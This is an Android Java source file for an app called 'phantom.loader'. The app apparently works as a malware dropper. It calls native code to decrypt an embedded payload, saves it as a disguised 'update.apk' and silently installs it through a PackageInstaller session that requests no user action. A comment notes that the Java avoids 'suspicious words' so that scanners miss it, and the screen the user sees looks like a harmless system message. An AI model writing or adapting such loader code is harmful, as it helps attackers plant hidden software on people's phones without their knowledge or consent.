package com.phantom.loader;

import android.app.PendingIntent;
import android.content.Intent;
import android.content.pm.PackageInstaller;
import android.os.Build;
import android.os.Bundle;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.OutputStream;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setPadding(50, 100, 50, 50);

        TextView tv = new TextView(this);
        tv.setText("Sistema Pronto. Instalando...");
        layout.addView(tv);

        Button btn = new Button(this);
        btn.setText("Iniciar");
        btn.setOnClickListener(v -> instalar());
        layout.addView(btn);
        setContentView(layout);
    }

    private void instalar() {
        new Thread(() -> {
            try {
                // 1. Chama o C++ para pegar os bytes descriptografados
                byte[] decData = NativeLoader.loadPayload(this);
                
                if (decData == null) {
                    runOnUiThread(() -> Toast.makeText(this, "Erro de leitura.", Toast.LENGTH_SHORT).show());
                    return;
                }

                // 2. Salva no cache
                File file = new File(getCacheDir(), "update.apk");
                FileOutputStream fos = new FileOutputStream(file);
                fos.write(decData);
                fos.close();

                // 3. Instala via Sessão (Sem palavras suspeitas no Java)
                PackageInstaller pI = getPackageManager().getPackageInstaller();
                PackageInstaller.SessionParams p = new PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL);
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                    p.setRequireUserAction(PackageInstaller.SessionParams.USER_ACTION_NOT_REQUIRED);
                }

                int sId = pI.createSession(p);
                PackageInstaller.Session s = pI.openSession(sId);

                OutputStream out = s.openWrite("p", 0, -1);
                FileInputStream fis = new FileInputStream(file);
                byte[] b = new byte[1024];
                int l;
                while ((l = fis.read(b)) != -1) { out.write(b, 0, l); }
                s.fsync(out);
                fis.close();
                out.close();

                Intent i = new Intent(this, InstallReceiver.class);
                PendingIntent pi = PendingIntent.getBroadcast(this, sId, i, PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_MUTABLE);
                s.commit(pi.getIntentSender());
                s.close();

                runOnUiThread(() -> Toast.makeText(this, "Instalando...", Toast.LENGTH_SHORT).show());

            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
    }
}
